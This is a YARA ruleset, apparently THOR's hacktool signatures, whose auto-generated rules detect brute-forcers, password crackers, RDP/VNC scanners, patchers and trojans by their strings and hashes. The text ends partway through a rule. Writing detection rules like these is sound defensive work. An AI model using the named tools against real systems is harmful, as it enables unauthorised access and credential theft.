/*
 * THOR Hacktool Ruleset
 * Florian Roth
 *
 * © 2015 BSK Consulting GmbH - All Rights Reserved
 */

/* Bruters */

rule GreenDream__ {
	meta:
		description = "Auto-generated rule - file GreenDream.exe"
		author = "Yara Bulk Rule Generator"
		hash = "ea4f209d389977f6251c4a64e08046bf"
	strings:
		$s1 = "GreenDream_.Form1.resources" fullword
		$s2 = "get_female_cannabis__eye_by_DannyEL6" fullword
		$s3 = "C:\\Users\\SmokingZ\\Documents\\Visual Studio 2008\\Projects\\GreenDream" fullword
		$s4 = "GreenDream_.Resources.resources" fullword
		$s5 = "female_cannabis__eye_by_DannyEL6" fullword
	condition:
		1 of them
}

rule RamblerQBrute {
	meta:
		description = "Auto-generated rule - file RamblerQBrute.exe"
		author = "Yara Bulk Rule Generator"
		hash = "604a63b4536f937f0b3ef8b139bf795d"
	strings:
		$s1 = "LOADER ERROR" fullword
		$s3 = "CB/-NOp\"" fullword
		$s5 = "y*sRU7bUT" fullword
		$s7 = "name=\"CodeGear RAD Studio\"" fullword
		$s10 = "processorArchitecture=\"*\"/>" fullword
		$s11 = "version=\"14.0.3513.24210\" " fullword
		$s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword
	condition:
		all of them
}
rule clxtshar {
	meta:
		description = "Auto-generated rule - file clxtshar.dll"
		author = "Yara Bulk Rule Generator"
		hash = "5cabf830813e23d7abc31daa3523929c"
	strings:
		$s0 = "Client is alive, no socket to the test server" fullword
		$s11 = "Sending VC data, DataSize=%d, HeadSize=%d, TailSize=%d, Name=%s" fullword
		$s14 = "\\client\\reskit\\smc\\tclient\\clx\\win32\\obj\\i386\\clxtshar.pdb" fullword
		$s15 = "Local mode. Sending messages to smclient. HWND=0x%x" fullword
		$s17 = "FEED_BITMAP:Can't send the prolog. WSAGetLastError=%d" fullword
	condition:
		4 of them
}
rule IR_IDMaker {
	meta:
		description = "Auto-generated rule - file IR IDMaker.exe"
		author = "Yara Bulk Rule Generator"
		hash = "f4b23b87f18f908719c2cfa3562dd3db"
	strings:
		$s1 = "name=\"Project1.exe\" " fullword
		$s4 = "edit.india.yahoo.com" fullword
		$s15 = "By: ParsProg Software. All Rights Reserved." fullword
		$s16 = "C:\\WINDOWS\\system32\\msvbvm60.dll\\3" fullword
	condition:
		2 of them
}

rule DUBrute {
	meta:
		description = "Auto-generated rule - file DUBrute.exe"
		author = "Yara Bulk Rule Generator"
		hash = "e9f4a3146655188c08290d58bfa8f193"
	strings:
		$s0 = "tptptptptptpgMgMgMgMxRxNxSxTxUdKdLd1lpfAxVxWs.xXpGpGpGxYvJnIezlpdZdZlpfAxZs.fSfx"
		$s6 = "mFjlmGmHmImJmKjIkumLmgmMlOiumhk#mNmOmPjolGmQmRjSlJmSlImTjOmUiAmVmWixmXmYmZj5lRlR"
		$s20 = "eOfMfNfOfP.3fQaOeVeVabbGaiahacagagagagagfRdiffdTesesfveofSbdbdbdbdbdbdbdbdbdbdbd"
	condition:
		all of them
}

rule Vbrute {
	meta:
		description = "Auto-generated rule - file vbrute.exe"
		author = "Yara Bulk Rule Generator"
		hash = "06b77708096725c7aad9aba5b38a1686"
	strings:
		$s0 = "div_m64" fullword
		$s6 = "accept" fullword
		$s7 = "Command6" fullword
		$s10 = "soft Visual Studi" fullword
		$s11 = "EVENT_SINK_" fullword
	condition:
		all of them
}
rule MaxBrute {
	meta:
		description = "Auto-generated rule - file MaxBrute.exe"
		author = "Yara Bulk Rule Generator"
		hash = "8da587686bc044457eb5895db8434ad5"
	strings:
		$s2 = "MaxBrute" fullword
		$s4 = "ConnectedRemoteIP" fullword
		$s5 = "Project1" fullword
		$s6 = "Clear Logs" fullword
		$s12 = "Command1" fullword
	condition:
		all of them
}
rule V_Brute_v_0_4 {
	meta:
		description = "Auto-generated rule - file V-Brute v 0.4.exe"
		author = "Yara Bulk Rule Generator"
		hash = "46a1d42c733db5c505d305d83edae4e4"
	strings:
		$s1 = "(www.xakepy.info)" fullword
		$s2 = "123456;qwerty  12345;q1w2e3  1234567;pass" fullword
		$s4 = "ConnectedRemoteIP" fullword
		$s7 = "V-Brute v 0.4" fullword
	condition:
		2 of them
}
rule Pfx_Brute {
	meta:
		description = "Auto-generated rule - file pfx.exe"
		author = "Yara Bulk Rule Generator"
		hash = "d1eac8020e478352fbe167c30817801d"
	strings:
		$s6 = "Y@PFX Brute by Kaimi and dx" fullword
		$s7 = "Example: pfx.exe cert.pfx dict.txt" fullword
		$s18 = "PPS: %8.2f; passwords tried: %u (%3.2f%%)" fullword
	condition:
		1 of them
}

rule RDPBrute3_0v_VNC {
	meta:
		description = "Auto-generated rule - file VNC.exe"
		author = "Yara Bulk Rule Generator"
		hash = "a4cddfaa5a1fc2abf8a920bee84ce8e3"
	strings:
		$s4 = "-vn:%-15s:%-7d  not_vnc4:wrong datas                              " fullword
		$s12 = "To increase the speed under linux, try ulimit -s unlimited" fullword
		$s19 = "RealVNC <= 4.1.1 Bypass Authentication Scanner" fullword
	condition:
		1 of them
}

rule bruters_release_svchost {
	meta:
		description = "Auto-generated rule - file svchost.exe"
		author = "Yara Bulk Rule Generator"
		hash = "c8d65500ba5746f4322e3d0131e598ab"
	strings:
		$s13 = "fck u, cracka!" fullword
	condition:
		all of them
}

rule Qtss_svchost {
	meta:
		description = "Auto-generated rule - file svchost.exe"
		author = "Yara Bulk Rule Generator"
		hash = "4331886a873ee5c8870f3fccf23563f9"
	strings:
		$s17 = "Fuck you, Spilberg! ;)" fullword
	condition:
		all of them
}
rule bad_files_bruters_jbbl01_jbbl {
	meta:
		description = "Auto-generated rule - file jbbl.exe"
		author = "Yara Bulk Rule Generator"
		hash = "b3cd30d74a17d5488f4a862787a8d783"
	strings:
		$s2 = "jbbl.XP_ProgressBar" fullword
		$s14 = "FC:\\WINDOWS\\system32\\stdole2.tlb" fullword
	condition:
		all of them
}

rule DUBrute_v_v1_1_brded2_tclient {
	meta:
		description = "Auto-generated rule - file tclient.dll"
		author = "Yara Bulk Rule Generator"
		hash = "2b91d9ecb73daacd31161687a20624e3"
	strings:
		$s12 = "Error creating process (szCmdLine=%s), GetLastError=0x%x" fullword
		$s16 = "lib\\obj\\i386\\tclient.pdb"
	condition:
		all of them
}

rule rdpthread {
	meta:
		description = "Auto-generated rule - file rdpthread.exe"
		author = "Yara Bulk Rule Generator"
		hash = "08460b6f9d3ff0f8ff5d892e4e7854a5"
	strings:
		$s1 = "mswin32\\Release\\ncrack.pdb"
	condition:
		all of them
}

rule Bruter_1_0_Bruter {
	meta:
		description = "Auto-generated rule - file Bruter.exe"
		author = "Yara Bulk Rule Generator"
		hash = "791c0ae4a17c7d1c598cc5b0b79538d2"
	strings:
		$s7 = "\\Release\\Bruter.pdb"
		$s17 = "Error: %s.   Trying user: %s, pass: %s again" fullword
	condition:
		1 of them
}
rule MineCrack {
	meta:
		description = "Auto-generated rule - file MineCrack.exe"
		author = "Yara Bulk Rule Generator"
		hash = "580df8076f9d417a9a4fbcb384ec6ba6"
	strings:
		$s15 = "\\Projects\\MineCrack\\MineCrack\\"
		$s18 = "MineCrack.Resources.resources" fullword
	condition:
		1 of them
}
rule Mozilla_Indy_Library_UA {
	meta:
		description = "Mozilla User Agent String - Indy Library"
		author = "Yara Bulk Rule Generator"
		super_rule = 1
		score = 18
		hash0 = "716fafd5ea9d1795ac550e57cb1e57aa"
		hash1 = "900cb7de8155c218e5811d2302660c25"
		hash2 = "76e8d73ea402a6a695848bfa05398974"
		type = "file"
	strings:
		$s3 = "Mozilla/3.0 (compatible; Indy Library)" fullword
	condition:
		PEFILE and $s3 and not filename matches /CA.dll/
}
rule BarsWF_SSE2_x64 {
	meta:
		description = "Auto-generated rule - from files BarsWF_CUDA_x64.exe, BarsWF_SSE2_x32.exe, BarsWF_CUDA_x32.exe, BarsWF_SSE2_x64.exe"
		author = "Yara Bulk Rule Generator"
		super_rule = 1
		hash0 = "48bceaa7458ccd66a40588a95dde9ef5"
		hash1 = "e0c401d86574fd49b0e323a1201993b8"
		hash2 = "9eceb7cb2ec50d97f49e9d52e411b38d"
		hash3 = "4d43671aba38d0c40e61c331c36e4808"
	strings:
		$s1 = "BarsWF MD5 bruteforcer v%s" fullword
		$s8 = "by Svarychevski Michail" fullword
		$s13 = "Please, specify charset: -c and/or -C command line options." fullword
		$s14 = "HAPPINESS ERROR: Unable to bruteforce as password was already found."
		$s19 = "' in charset definition (-c parameter)" fullword
	condition:
		1 of them
}

/* Hacksoft */

rule quick_batch_file_compiler_2_1_5_0_patch {
	meta:
		description = "Auto-generated rule - file quick.batch.file.compiler.2.1.5.0-patch.exe"
		author = "Yara Bulk Rule Generator"
		hash = "b80f06c6601003b9eded27571373f26d"
	strings:
		$s0 = "2Dj@GoFHup" fullword
		$s8 = "WaitForS" fullword
		$s15 = "Cal Windo" fullword
		$s16 = "BM1O%hPNeZ95" fullword
	condition:
		all of them
}
rule hacksoft_CSHack_CSHack {
	meta:
		description = "Auto-generated rule - file CSHack.exe"
		author = "Yara Bulk Rule Generator"
		hash = "d532bcf8e61a6e4eef1c3374e39dc52c"
	strings:
		$s0 = "b@wk 8x[Q" fullword
		$s6 = "Qcq_2/]{Ho" fullword
		$s7 = ">&+b8RjRF" fullword
		$s16 = "kP\\&V9!=Uc8" fullword
		$s17 = ":55{f\"N^}" fullword
	condition:
		all of them
}

rule hacksoft_AnyPlace_Control_AC_4_3_0_1_crack_Patch {
	meta:
		description = "Auto-generated rule - file Patch.exe"
		author = "Yara Bulk Rule Generator"
		hash = "b575ab02add69b38a9d25bc5981b99b6"
	strings:
		$s2 = "name=\"diablo2oo2's.Universal.Patcher\"" fullword
		$s5 = "<description>diablo2oo2's.Universal.Patcher</description>" fullword
	condition:
		all of them
}
rule hacksoft_RAdmin_Files_svchost {
	meta:
		description = "Auto-generated rule - file svchost.exe"
		author = "Yara Bulk Rule Generator"
		hash = "377779e07226ab796bdaa2c6466608ec"
	strings:
		$s4 = "try to hack" fullword
		$s7 = "Can't load function from library" fullword
		$s14 = "Can't load library" fullword
	condition:
		all of them
}

rule hacksoft_RAdmin_Files_AdmDll {
	meta:
		description = "Auto-generated rule - file AdmDll.dll"
		author = "Yara Bulk Rule Generator"
		hash = "c915181e93fe3d4c41b1963180d3c535"
	strings:
		$s0 = "AdmDllInitAccessCheck" fullword
		$s7 = "VerifySignatureClient" fullword
		$s8 = "Special access %s" fullword
		$s12 = "Special access..." fullword
		$s14 = "SYSTEM\\RAdmin\\v2.0\\Server\\Users" fullword
		$s18 = "GetServerNextDataBuf" fullword
	condition:
		2 of them
}

rule DotFix_NiceProtect {
	meta:
		description = "Auto-generated rule - file DotFix NiceProtect.exe"
		author = "Yara Bulk Rule Generator"
		hash = "d895c3ebb3ab941b405390010a5915b3"
	strings:
		$s3 = "  <description>DotFix NiceProtect</description>" fullword
		$s6 = "    name=\"DotFix NiceProtect\"" fullword
	condition:
		1 of them
}
rule Barrio_Trojan {
	meta:
		description = "Auto-generated rule - file Barrio Trojan.exe"
		author = "Yara Bulk Rule Generator"
		hash = "5bc0e3ebf0167eff8fb3df5945f87e3f"
	strings:
		$s0 = "#DWgwvuS4j" fullword
		$s1 = "LOADER ERROR" fullword
		$s2 = "qoksqnwj\"j" fullword
		$s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword
		$s6 = "zepdsgXzqh" fullword
		$s10 = "The ordinal %u could not be located in the dynamic link library %s" fullword
	condition:
		all of them
}
rule PH_Inyector_v2 {
	meta:
		description = "Auto-generated rule - file PH-Inyector v2.exe"
		author = "Yara Bulk Rule Generator"
		hash = "8a50873415bd0b03bc69b0838391a68b"
	strings:
		$s1 = "PH-Inyector v2" fullword
		$s4 = "C:\\Archivos de programa\\Microsoft Visual Studio\\VB98\\VB6.OLB" fullword
		$s5 = "CREAR SERVIDOR" fullword
		$s10 = "Agregar Registro" fullword
		$s14 = "C:\\WINDOWS\\system32\\MSCOMCTL.oca" fullword
		$x1 = "PH-Inyector V2 By Xa0s"
		$x2 = "www.professional-hacker.org" fullword
	condition:
		3 of ($s*) or $x1 or $x2
}
rule radmin_viewer {
	meta:
		description = "Auto-generated rule - file radmin_viewer.exe"
		author = "Yara Bulk Rule Generator"
		hash = "2d219cc28a406dbfa86c3301e8b93146"
	strings:
		$s3 = "<description>IEBars</description>" fullword
		$s5 = "name=\"Famatech.Radmin.Viewer\"" fullword
		$s14 = "deflate 1.2.1 Copyright 1995-2003 Jean-loup Gailly " fullword
	condition:
		all of them
}
rule hacksoft_RAdmin_Files_raddrv {
	meta:
		description = "Auto-generated rule - file raddrv.dll"
		author = "Yara Bulk Rule Generator"
		hash = "b50d22ab0323cbd0fedfdf4689bc1301"
	strings:
		$s3 = "Unloading Raddrv driver" fullword
	condition:
		all of them
}

rule _hoster_hoster_bulder_killer {
	meta:
		description = "Auto-generated rule - from files hoster.exe, hoster_bulder.exe, killer.exe"
		author = "Yara Bulk Rule Generator"
		super_rule = 1
		hash0 = "8c809d738e956ffe4010b17e26008048"
		hash1 = "a4e5bb9e4f94a636eb916c7815a25451"
		hash2 = "08447e0458d9c5cadef71a9f14e28420"
		score = 15
	strings:
		$s10 = "MySettingsProperty" fullword
		$s11 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword
		$s12 = "Create__Instance__" fullword
		$s14 = "m_UserObjectProvider" fullword
	condition:
		all of them
}

rule _Kriptomatik_UsbS_ShareazaS_LimewireS_EmuleS_CDBurnS_BearShareS {
	meta:
		description = "Auto-generated rule - from files Kriptomatik.exe, UsbS.dll, ShareazaS.dll, LimewireS.dll, EmuleS.dll, CDBurnS.dll, BearShareS.dll"
		author = "Yara Bulk Rule Generator"
		super_rule = 1
		hash0 = "1826c82d3b1756b374b9c7516179137b"
		hash1 = "eb3c64fda4048fe8aed9dd8554092de4"
		hash2 = "d947415f73261d404a51cc4aacd037f8"
		hash3 = "6fea3c193f01614ffe9fc4707af861d6"
		hash4 = "bab23b34249d37b7ee9c4daa1acb1663"
		hash5 = "ad9780a9f970aec4cb166bea61c2e91a"
		hash6 = "33b9f0b1bff0e35eb291eec62b07f1ac"
	strings:
		$s0 = "KmadTypes" fullword
		$s3 = "%randomstring%" fullword
		$s5 = "FastShareMem" fullword
		$s7 = "%mydocuments%" fullword
		$s10 = "%filename%" fullword
		$s11 = "%fileextension%" fullword
		$s14 = "%startup%" fullword
		$s15 = "Error while reading Icon" fullword
		$s18 = "madStrings" fullword
	condition:
		all of them
}

/* Hacktools */

rule SCB_Lab_s___Proffessionall_Malware_Tool {
	meta:
		description = "Semi-Auto-generated rule - file SCB Lab's - Proffessionall Malware Tool.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "c334a168f45d5669cd3cfdcc726e2283"
	strings:
		$s0 = "scd95jrjx2n2cfvg65q5fnbbf5pxk4vbshng8vret4ftmt1xzs" fullword
		$s1 = "Proffessional Malware Tool"
		$s2 = "scblabs"
		$s3 = "sharki@sharki.es"
	condition:
		2 of them
}
rule PasswordsPro {
	meta:
		description = "Semi-Auto-generated rule - file PasswordsPro.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "9a630a13e95a9392eb48c991affacc1a"
	strings:
		$s0 = "DIMaaXXXXMM@@::" fullword
		$s2 = "PasswordsPro" fullword
		$s3 = "IUSQIQIHGF7&$" fullword
	condition:
		2 of them
}

rule _PasswordsPro_v2_5_5_0_Modules_Bonus_MD5_Cisco_PIX_pix_x86 {
	meta:
		description = "Semi-Auto-generated rule - file pix_x86.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "9e322efbb160e93377c73adb2cb07e85"
	strings:
		$s0 = "PasswordsPro" fullword
		$s1 = "pix_x86.dll" fullword
	condition:
		all of them
}
rule _PasswordsPro_v2_5_5_0_Modules_MaNGOS {
	meta:
		description = "Semi-Auto-generated rule - file MaNGOS.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "5c5cd92ee8cd5f23a959dfe7fa3b773d"
	strings:
		$s0 = "Insidepro" fullword
		$s1 = "MaNGOS" fullword
	condition:
		all of them
}
rule BobCat_Alpha_v0_4 {
	meta:
		description = "Semi-Auto-generated rule - file BobCat Alpha v0.4.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "382a9e7ceaaa4a5d002fc5e24b8078f5"
	strings:
		$s0 = "BruteForcePassword" fullword
		$s1 = "BobCat" fullword
		$s2 = "BlindMSSQLInjectionExploitation" fullword
		$s3 = "<PrivateImplementationDetails>{2984508C-8828-42C0-B556-E4DFB2DE373B}" fullword
	condition:
		2 of them
}

rule WebBruteForcer {
	meta:
		description = "Semi-Auto-generated rule - file WebBruteForcer.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "30d58817d01b76f3157b68d5d5388d48"
	strings:
		$s0 = "WebBruteForcer" fullword
		$s1 = "IncorrectProxiesFileMarkupException" fullword
		$s2 = "set_MaximumAutomaticRedirections" fullword
	condition:
		2 of them
}
rule aimpr_v3_70_GEGTER_inline_patch {
	meta:
		description = "Semi-Auto-generated rule - file aimpr_v3.70_GEGTER_inline_patch.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "eb9ff952d21e2af13919d6198b6d6701"
	strings:
		$s0 = "diablo2oo2's.Universal.Patcher" fullword
		$s1 = "pqrstuvwxyz.D:" fullword
		$s2 = "HKEY_CLASSES_ROOb" fullword
	condition:
		2 of them
}

rule _The_Bat__UnPass_v1_3_tbup {
	meta:
		description = "Semi-Auto-generated rule - file tbup.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "311485abe21c86dbcbfc6f1077ccba4a"
	strings:

		$s3 = "Magelq MSWHEEL" fullword
		$s4 = "HIJKLMNO1STUVWJ" fullword
		$s9 = "ANSI_CHARSET" fullword
		$s10 = "processorArchitecture=\"*\"/>" fullword
		$s15 = "name=\"DelphiApplication\"" fullword
		$s19 = "Exception,zO" fullword
	condition:
		all of them
}

rule Total_Commander_Password_Recovery_setup {
	meta:
		description = "Semi-Auto-generated rule - file Total-Commander-Password-Recovery-setup.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "b9571d34ab9524ec0504c3c104586551"
	strings:
		$s16 = "URL=http://www.reactive-software.com/" fullword
		$s17 = "\\wininit.ini" fullword
	condition:
		all of them
}

rule _sorter_sorter {
	meta:
		description = "Semi-Auto-generated rule - file sorter.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "dfcb95224c02879ad4bd1f25712479cb"
	strings:
		$s0 = "ConsoleApplication57.exe" fullword
		$s1 = "C:\\Documents and Settings\\Admin\\" fullword
		$s2 = " Russia 2010" fullword
		$s3 = "ConsoleApplication57" fullword
	condition:
		2 of them
}

rule _PasswordsPro_v2_5_5_0_Modules_Bonus_NTLMv1_NTLMv1 {
	meta:
		description = "Semi-Auto-generated rule - file NTLMv1.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "59482e40b54ab7103414ae5f8d4af56c"
	strings:
		$s2 = "NTLM Auth v1 and MS-CHAP" fullword
		$s12 = "NTLMv1 auth hash cracker." fullword
	condition:
		all of them
}
rule Lineage_C4 {
	meta:
		description = "Semi-Auto-generated rule - file Lineage C4.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "4269433f26099a2cb2c6cae6e37dfddf"
	strings:
		$s6 = "Lineage II C4" fullword
		$s7 = "Lineage C4.dll" fullword
		$s15 = "Hash type: Lineage II C4" fullword
	condition:
		all of them
}
rule sha1__username__pass_ {
	meta:
		description = "Semi-Auto-generated rule - file sha1($username.$pass).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "9e413e482b0c855d66d6815f191b8eed"
	strings:
		$s2 = "Hash type: sha1($username.$pass) [PHP], used with SMF v1.1.x" fullword
	condition:
		all of them
}
rule md5__hex_salt__pass__hex_salt_ {
	meta:
		description = "Semi-Auto-generated rule - file md5($hex_salt.$pass.$hex_salt).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "4c70b9db8a71e916a5d977f267a82162"
	strings:
		$s7 = "Hash type: md5($hex_salt.$pass.$hex_salt) [PHP], used with TBDev v2.0" fullword
		$s12 = "md5($hex_salt.$pass.$hex_salt) [PHP]" fullword
	condition:
		all of them
}
rule md5__salt_md5__pass__ {
	meta:
		description = "Semi-Auto-generated rule - file md5($salt.md5($pass)).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "98c245aa5e9e12c31dca1f07c9490421"
	strings:
		$s3 = "Hash type: md5($salt.md5($pass)) [PHP]" fullword
		$s14 = "md5($salt.md5($pass)) [PHP]" fullword
	condition:
		all of them
}
rule _PasswordsPro_v2_5_5_0_Modules_Bonus_Eggdrop_eggdrop {
	meta:
		description = "Semi-Auto-generated rule - file eggdrop.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "ef511692531620a43a081581fa5e62b6"
	strings:
		$s0 = "PasswordsPro Module for Eggdrop IRC bot passwords, v1.1 (c) 2008, <wyse101@gmail"
		$s3 = "Blowfish (Eggdro"
		$s4 = "eggdrop.dll" fullword
	condition:
		2 of them
}
rule MD5_Wordpress_ {
	meta:
		description = "Semi-Auto-generated rule - file MD5(Wordpress).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "628482507fb62c0464bdf4b63959069f"
	strings:
		$s7 = "Hash type: MD5(Wordpress)" fullword
		$s12 = "MD5(Wordpress).dll" fullword
	condition:
		all of them
}
rule _ie_pass_view_1_17_iepv {
	meta:
		description = "Semi-Auto-generated rule - file iepv.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "28c110b8d0ad095131c8d06043678086"
	strings:
		$s0 = "!DOCTYPE HTM" fullword
		$s4 = "type=\"Win32\" name=\"Microsoft.Windows.Common-Controls"
		$s7 = "$NIRSOFT_ PV_KEY$F" fullword
		$s15 = "IE PassView" fullword
	condition:
		2 of them
}
rule md5__salt_md5__pass___salt_ {
	meta:
		description = "Semi-Auto-generated rule - file md5($salt.md5($pass).$salt).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "e13994c5754cae190c8eb75213ce3425"
	strings:
		$s7 = "md5($salt.md5($pass).$salt) [PHP]" fullword
		$s17 = "Hash type: md5($salt.md5($pass).$salt) [PHP]" fullword
	condition:
		all of them
}
rule md5_md5__pass__md5__salt__ {
	meta:
		description = "Semi-Auto-generated rule - file md5(md5($pass).md5($salt)).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "4b0c4e24e91590f2a922d27ab42adf97"
	strings:
		$s0 = "md5(md5($pass).md5($salt)) [PHP]" fullword
		$s8 = "Hash type: md5(md5($pass).md5($salt)) [PHP]" fullword
	condition:
		all of them
}
rule MD5_Base64_ {
	meta:
		description = "Semi-Auto-generated rule - file MD5(Base64).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "0e0114a533efa1603c5385ad647481e8"
	strings:
		$s8 = "Hash type: MD5(Base64)" fullword
		$s12 = "MD5(Base64).dll" fullword
		$s15 = "MD5(Base64)" fullword
	condition:
		all of them
}
rule Haval_256 {
	meta:
		description = "Semi-Auto-generated rule - file Haval-256.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "a6f53af27f75fb70c3a4a1fae2c55006"
	strings:
		$s5 = "Haval-256.dll" fullword
		$s12 = "Hash type: Haval-256" fullword
	condition:
		all of them
}

rule md5_md5__salt___pass_ {
	meta:
		description = "Semi-Auto-generated rule - file md5(md5($salt).$pass).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "805fc998e3c3fa42648547a6ddb5e74d"
	strings:
		$s15 = "Hash type: md5(md5($salt).$pass) [PHP], used with MyBB v1.2.x" fullword
		$s16 = "md5(md5($salt).$pass).dll" fullword
	condition:
		all of them
}
rule md5__pass__salt_ {
	meta:
		description = "Semi-Auto-generated rule - file md5($pass.$salt).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "3252e908298bbc2adeb33bfcd24c212d"
	strings:
		$s6 = "md5($pass.$salt) [PHP]" fullword
		$s11 = "Hash type: md5($pass.$salt) [PHP], used with WB News v1.0.0" fullword
	condition:
		all of them
}
rule MD5_APR_ {
	meta:
		description = "Semi-Auto-generated rule - file MD5(APR).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "34be50eacc107edc068cb8ca142bf954"
	strings:
		$s0 = "MD5(APR).dll" fullword
		$s3 = "Hash type: MD5(APR)" fullword
	condition:
		all of them
}
rule sha1__salt_sha1__salt_sha1__pass___ {
	meta:
		description = "Semi-Auto-generated rule - file sha1($salt.sha1($salt.sha1($pass))).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "e9aba489cb4948a6d6a69ff32b0b6a4d"
	strings:
		$s4 = "sha1($salt.sha1($salt.sha1($pass))).dll" fullword
		$s7 = "Hash type: sha1($salt.sha1($salt.sha1($pass))) [PHP], used with Woltlab BB" fullword
	condition:
		all of them
}
rule _PasswordsPro_v2_5_5_0_Modules_Bonus_MSCHAPv1v2_mschap {
	meta:
		description = "Semi-Auto-generated rule - file mschap.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "d3ac8fd29c03b944282e114ff6ad041a"
	strings:
		$s0 = "_$L008cbc_enc_jmp_table" fullword
		$s16 = "PasswordsPro Module for MS-CHAP v1 + v2" fullword
	condition:
		all of them
}
rule MezcalSetup {
	meta:
		description = "Semi-Auto-generated rule - file MezcalSetup.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "9db4d048e04ebae431994f787f2df4fa"
	strings:
		$s8 = "RichEd20.dll" fullword
		$s10 = "NullsoftInst3m" fullword
		$s13 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"u"
		$s15 = "\\wininit.ini" fullword
	condition:
		all of them
}
rule SHA_512_Unix_ {
	meta:
		description = "Semi-Auto-generated rule - file SHA-512(Unix).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "ea7dc612e00e476b53b019d3134cfdfe"
	strings:
		$s1 = "Hash type: SHA-512(Unix)" fullword
		$s5 = "SHA-512(Unix).dll" fullword
	condition:
		all of them
}
rule md5__hex_salt__pass_ {
	meta:
		description = "Semi-Auto-generated rule - file md5($hex_salt.$pass).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "b21ae604ecc81d07791cbbbfbc025823"
	strings:
		$s4 = "Hash type: md5($hex_salt.$pass) [PHP]" fullword
		$s14 = "md5($hex_salt.$pass).dll" fullword
	condition:
		all of them
}
rule MD4_HMAC_ {
	meta:
		description = "Semi-Auto-generated rule - file MD4(HMAC).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "23c26b9453e8108c7e56a29c7991b881"
	strings:
		$s7 = "MD4(HMAC).dll" fullword
		$s14 = "Hash type: MD4(HMAC)" fullword
	condition:
		all of them
}
rule SHA_1_Django_ {
	meta:
		description = "Semi-Auto-generated rule - file SHA-1(Django).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "d368b837856a685bd3a9af1571ad259e"
	strings:
		$s1 = "Hash type: SHA-1(Django)" fullword
		$s6 = "SHA-1(Django).dll" fullword
	condition:
		all of them
}
rule sha1__username__pass__salt_ {
	meta:
		description = "Semi-Auto-generated rule - file sha1($username.$pass.$salt).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "d90314bd0ce102e6a47bc62049b17986"
	strings:
		$s4 = "sha1($username.$pass.$salt).dll" fullword
		$s14 = "Hash type: sha1($username.$pass.$salt) [PHP]" fullword
	condition:
		all of them
}
rule MPRSetup {
	meta:
		description = "Semi-Auto-generated rule - file MPRSetup.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "0b63725bd18f2b1591754d87695dc5cd"
	strings:
		$s0 = "regsvr32 /u Release\\VCTestPlugin.dll" fullword
		$s1 = "PLUGICON BITMAP \"plug.bmp\"" fullword
		$s5 = "regsvr32 TestPlugin.dll" fullword
		$s7 = "del *.opt *.plg #" fullword
		$s8 = "STDAPI DllCanUnloadNow(void);" fullword
	condition:
		all of them
}
rule SHA_256_Django_ {
	meta:
		description = "Semi-Auto-generated rule - file SHA-256(Django).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "9077556482930ed7b711dda2bb769187"
	strings:
		$s6 = "Hash type: SHA-256(Django)" fullword
		$s7 = "SHA-256(Django).dll" fullword
	condition:
		all of them
}
rule _PasswordsPro_v2_5_5_0_Modules_Bonus_MSSQL_msqlx86 {
	meta:
